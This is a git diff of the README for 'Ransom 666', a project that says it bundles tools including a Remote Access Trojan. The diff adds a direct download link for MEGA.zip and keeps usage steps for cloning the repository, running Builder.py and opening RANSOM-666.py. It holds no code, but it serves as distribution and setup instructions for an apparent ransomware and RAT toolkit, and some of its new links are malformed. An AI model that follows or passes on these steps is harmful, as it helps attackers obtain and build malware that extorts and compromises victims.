@@ -1,6 +1,6 @@
 # Ransom 666 #
 
-![Logo](https://via.placeholder.com/150)
+![Logo]([https://raw.githubusercontent.com/Coder333-A/RANSOM-666/main/icon.png])
 
 [![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
 ![GitHub repo size](https://img.shields.io/github/repo-size/Coder333-A/RANSOM-666)
@@ -27,8 +27,7 @@ Ransom 666 is a project that includes various tools such as a Remote Access Troj
 - [Changelog](#-changelog)
 - [Contributing](#-contributing)
 - [Support](#-support)
-- [Acknowledgements](#-acknowledgements)
-- [Contact](#-contact)
+- [Disclaimer][#-disclaimer]
 
 ## 🛠️ Installation ##
 
@@ -36,7 +35,7 @@ Instructions on how to install and set up RANSOM-666 on your computer.
 
 <h3 align="left">Let's get started!:</h3>
 <h3 align="left">Download python!</h3>
-<p align="left"> <a href="https://www.python.org" target="_blank" rel="noreferrer"> <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/python/python-original.svg" alt="python" width="40" height="40"/> </a> </p>
+<p align="left"> <a href="https://www.python.org" target="_blank" rel="noreferrer"> <img src="/python-original.svg" alt="python" width="40" height="40"/> </a> </p>
 
 ```sh
 git clone https://github.com/Coder333-A/RANSOM-666.git
@@ -46,7 +45,7 @@ cd RANSOM-666
 ## 🚀 Usage ##
 
 - Install Python. If You Have Not Installed Python On Your PC.
-- UnZip ```MEGA.zip```
+- UnZip [```MEGA.zip```](https://raw.githubusercontent.com/Coder333-A/RANSOM-666/MEGA/MEGA.zip)
 - Run ```Builder.py```
 - Wait Till a message box saying 'Done' appears
 - Open ```RANSOM-666.py```
@@ -70,7 +69,7 @@ cd RANSOM-666
 
 ## 📸 Screenshots ##
 
-![Screenshot](https://github.com/Coder333-A/RANSOM-666/blob/main/Screenshot.png)
+![Screenshot](https://https://raw.githubusercontent.com/Coder333-A/RANSOM-666/main/Screenshot.png)
 
 ## 📝 Changelog ##
 
